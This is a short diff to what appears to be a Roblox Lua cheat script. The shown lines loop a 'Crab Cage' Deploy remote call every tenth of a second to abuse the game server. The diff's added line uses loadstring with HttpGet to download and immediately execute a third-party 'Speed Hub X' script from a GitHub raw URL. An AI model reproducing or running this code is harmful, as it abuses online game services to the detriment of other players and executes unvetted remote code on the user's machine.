@@ -20,3 +20,6 @@ while true do
 task.wait(0.1)
 game.Players.LocalPlayer.Character["Crab Cage"].Deploy:FireServer({CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame})
 end
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
